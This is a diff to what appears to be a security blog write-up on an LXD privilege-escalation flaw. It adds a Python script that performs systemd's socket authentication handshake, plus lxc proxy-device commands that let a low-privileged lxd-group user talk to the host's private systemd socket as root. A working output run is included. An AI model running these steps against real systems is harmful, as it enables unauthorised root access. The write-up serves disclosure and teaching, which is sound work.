@@ -279,9 +279,84 @@ Take a look at the first messages above. The text inside the `iov_base` sections
 
 This looks pretty relevant to what we want.
 
-I'll spare you the trial and error and just state that the first message is indeed authenticating to the service. It must start with a null byte and then contain the rest of the text inside the quotes. While `strace` shows these broken into fragments, we can actually piece them together into singe variables in a Python script and thrown them at the socket. If we get the syntax EXACTLY right, we can essentially run systemctl commands just by talking to the socket.
+Let's see if we can use this to have a conversation with systemd.
 
-Because we can leverage the LXD vulnerability to masquerade as root to any UNIX socket, we can now run `systemctl` commands as root from any low-privilege user who is a member of the `lxd` group.
+Take this short python script:
+
+```py
+#!/usr/bin/env python3
+
+"""
+Sends initial auth stream to systemd's private socket
+
+As demonstrated in https://initblog.com/2019/lxd-root/
+"""
+
+import socket
+import sys
+
+AUTH = u'\0AUTH EXTERNAL 30\r\nNEGOTIATE_UNIX_FD\r\nBEGIN\r\n'
+
+def send_msg(sock_name, msg):
+    """Send raw message to an AF_UNIX socket"""
+
+    # Connect to the defined socket
+    client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    client_sock.connect(sock_name)
+
+    # Send the message
+    client_sock.sendall(AUTH.encode('latin-1'))
+
+    # If there is a reply, print it to console
+    reply = client_sock.recv(8192).decode("latin-1")
+    if reply:
+        print(reply)
+
+def main():
+    send_msg(sys.argv[1], AUTH)
+
+if __name__ == '__main__':
+    main()
+```
+
+This is designed to connect to a socket specified as the first argument and then to send the first message we observed in the output of `strace`.
+
+What happens when we run this as our lowpriv user directly against the systemd private socket?
+
+```
+lowpriv@server:~$ ./systemd_auth.py /run/systemd/private
+[!] Connection reset...
+```
+
+OK, so nothing back from the socket. We know we can spoof root using proxied sockets. Let's create a two-stage tunnel next. The first will connect to the private systemd socket on our host and bind it inside the container to `/tmp/container_sock`. The second will connect to that new socket inside the container and then bind it to `/tmp/host_sock` on our host.
+
+The reason for this two-step proxy is just so we can do all our work on the host, without having to jump inside the container.
+
+```
+# Create initial socket proxy
+lowpriv@server:~$ lxc config device add falcor container_sock \
+    proxy connect=unix:/run/systemd/private listen=unix:/tmp/container_sock \
+    bind=container mode=0777
+Device container_sock added to falcor
+
+# Create second socket proxy
+lowpriv@server:~$ lxc config device add falcor host_sock \
+    proxy connect=unix:/tmp/container_sock listen=unix:/tmp/host_sock \
+    bind=host mode=0777
+Device host_sock added to falcor
+```
+
+Alright, now let let's run the python script again to see if we can now talk to systemd.
+
+```
+lowpriv@server:~$ ./systemd_auth.py /run/systemd/private
+OK a1cde28f7bdd46f283f348654d7fa07f
+AGREE_UNIX_FD
+```
+
+Excellent! We are now speaking directly to the host's systemd service as if we are root.
+
+From here, we can continue to analyze `strace` output to build the `systemctl` commands we want to run. While `strace` shows the message data broken into fragments, we can actually piece them together into singe variables in a Python script and thrown them at the socket.
 
 You can review the source code of lxd_rootv2.py to fully understand how this is implemented.
 
